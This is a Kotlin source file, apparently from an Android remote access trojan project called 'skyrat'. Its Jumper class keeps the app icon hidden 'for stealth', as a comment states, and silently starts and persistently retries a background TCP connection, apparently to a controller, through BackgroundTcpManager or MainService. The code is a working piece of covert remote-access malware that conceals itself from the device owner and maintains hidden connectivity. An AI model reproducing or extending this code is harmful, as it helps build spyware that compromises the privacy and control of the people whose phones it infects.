package com.techsky.skyrat

import android.Manifest
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresPermission
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class Jumper(private val context: Context) {

    companion object {
        private const val TAG = "JumperClass"
    }

    fun init() {
        Log.d(TAG, "Jumper initialization started")

        if (isNetworkAvailable()) {
            Log.d(TAG, "Network is available, starting connection setup")

            // DON'T unhide the app icon - keep it hidden for stealth
            // Functions(null).unHideAppIcon(context) // REMOVED THIS LINE

            // Only start the TCP connection, don't reveal the app
            startTcpConnection()
        } else {
            Log.d(TAG, "Network not available, will retry later")
            // Schedule retry when network becomes available
            scheduleNetworkRetry()
        }
    }

    fun initWithRetry() {
        Log.d(TAG, "Jumper initialization with retry logic")

        CoroutineScope(Dispatchers.IO).launch {
            var attempts = 0
            val maxAttempts = 5

            while (attempts < maxAttempts) {
                attempts++

                if (isNetworkAvailable()) {
                    Log.d(TAG, "Network available on attempt $attempts, starting connection")
                    startTcpConnection()
                    break
                } else {
                    Log.d(TAG, "Network unavailable on attempt $attempts, waiting...")
                    // FIXED: Convert to Long properly
                    delay(30000L * attempts) // Progressive delay - convert attempts to Long
                }
            }

            if (attempts >= maxAttempts) {
                Log.e(TAG, "Failed to establish connection after $maxAttempts attempts")
                schedulePeriodicRetry()
            }
        }
    }

    private fun schedulePeriodicRetry() {
        CoroutineScope(Dispatchers.IO).launch {
            while (true) {
                delay(300000L) // Retry every 5 minutes
                if (isNetworkAvailable()) {
                    Log.d(TAG, "Network restored, attempting connection")
                    startTcpConnection()
                    break
                }
            }
        }
    }

    private fun startTcpConnection() {
        Log.d(TAG, "Starting TCP connection setup")

        try {
            // Try background TCP manager first
            val backgroundManager = BackgroundTcpManager(context)
            backgroundManager.startConnection()
            Log.d(TAG, "Background TCP manager started successfully")

        } catch (e: Exception) {
            Log.e(TAG, "Background TCP manager failed, starting service: ${e.message}")

            // If BackgroundTcpManager fails, start MainService as fallback
            val serviceIntent = Intent(context, MainService::class.java)
            try {
                context.startService(serviceIntent)
                Log.d(TAG, "MainService started as fallback")
            } catch (serviceException: Exception) {
                Log.e(TAG, "Failed to start MainService: ${serviceException.message}")
            }
        }
    }

    private fun scheduleNetworkRetry() {
        // This could be implemented with WorkManager or similar for production
        Log.d(TAG, "Network retry scheduled")

        // For now, just try again after a delay
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            Log.d(TAG, "Retrying network check...")
            init()
        }, 30000L) // FIXED: Explicit Long literal
    }

    @Suppress("DEPRECATION")
    private fun isNetworkAvailable(): Boolean {
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val network = connectivityManager.activeNetwork ?: return false
                val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
                val hasInternet = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                val hasValidated = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)

                Log.d(TAG, "Network check - Internet: $hasInternet, Validated: $hasValidated")
                hasInternet && hasValidated

            } else {
                val networkInfo = connectivityManager.activeNetworkInfo
                val isConnected = networkInfo != null && networkInfo.isConnected
                Log.d(TAG, "Network check (legacy) - Connected: $isConnected")
                isConnected
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking network availability: ${e.message}")
            false
        }
    }

    @RequiresPermission(Manifest.permission.ACCESS_NETWORK_STATE)
    fun checkAndReconnect() {
        Log.d(TAG, "Manual reconnection check triggered")
        init()
    }
}